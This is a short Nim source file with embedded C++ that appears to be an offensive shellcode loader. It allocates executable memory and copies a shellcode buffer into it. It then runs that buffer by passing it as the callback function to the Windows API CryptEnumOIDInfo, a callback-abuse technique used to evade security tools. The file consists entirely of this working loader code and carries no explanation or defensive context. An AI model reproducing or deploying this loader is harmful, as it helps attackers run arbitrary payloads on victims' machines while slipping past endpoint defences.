{.passL:"-l Crypt32".}
import public

{.emit: """

int CryptEnumOIDInfoNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    CryptEnumOIDInfo(NULL, NULL, NULL, (PFN_CRYPT_ENUM_OID_INFO)addr);
    return 0;
}
"""
.}

proc CryptEnumOIDInfoNim(plainBuffer:cstring,size:cint):cint {.importcpp:"CryptEnumOIDInfoNim(@)",nodecl.}

discard CryptEnumOIDInfoNim(code,codelen)